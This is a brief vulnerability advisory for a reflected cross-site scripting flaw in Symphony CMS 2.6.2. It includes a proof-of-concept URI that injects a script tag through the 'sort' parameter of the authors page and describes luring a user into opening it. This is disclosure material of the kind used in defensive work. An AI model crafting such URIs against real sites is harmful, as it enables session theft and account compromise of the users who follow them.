To exploit a cross-site scripting vulnerability, an attacker must entice an unsuspecting user to follow a malicious URI.

The following example URI is available:

http://www.example.com/symphony-2.6.2/symphony/system/authors/?sort=&lt;/h1&gt;&lt;script&gt;alert(String.fromCharCode(72,69,76,76))&lt;/script&gt;&lt;h1&gt;&amp;order=asc
